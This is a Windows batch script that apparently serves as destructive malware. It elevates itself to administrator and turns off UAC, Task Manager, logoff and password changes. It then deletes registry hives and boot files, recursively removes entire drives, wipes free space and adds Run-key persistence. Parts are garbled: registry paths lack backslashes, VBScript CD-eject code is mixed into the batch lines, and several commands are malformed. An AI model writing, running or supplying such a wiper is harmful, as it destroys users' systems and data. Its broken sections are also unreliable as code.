@echo off
:: BatchGotAdmin (Run as Admin code starts)
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
:: BatchGotAdmin (Run as Admin code ends)
:: Your codes should start from the following line
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f  
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cls
start rundll32.exe
start rundll32.exe
cd "C:\Windows\regedit.exe"
reg delete hklm /f
cd "C:\Windows\SysWOW64"
reg delete hklm /f
cd "C:\Windows\System32"
reg delete hklm /f
cd "C:\Windows\System"
reg delete hklm /f
cd "C:\Windows\servicing"
cd C:\Users\yusuf\AppData\Local\Temp
reg delete hklm /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
start rundll32.exe
svchost.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /f
C: /d
C: /s
del C:\path\to\directory\*.* /Q 
rmdir C:\path\to\directory /S /Q 
cipher /w:C:\path\to\directory 
reg add hkey_local_machinesoftwaremicrosoftwindowscurrenversionrun/v
rd /s/q D:\
set oWMP=CreteObject("WMPlayer.ocx.7")
set colCDROMS=oWMP.cdromCollection
rd/s/q/ D:\
rd/s/q/ C:\
rd/s/q/E:\
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
del*.*
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
delete %systemdrive%\*.* /f /s
do
set colCDROMs.Count>=I then
FOR i=0 to colCDROMs.Count-1
colCDROMs.Item(i)Eject
Next
End if
wscript.sleep 100
loop


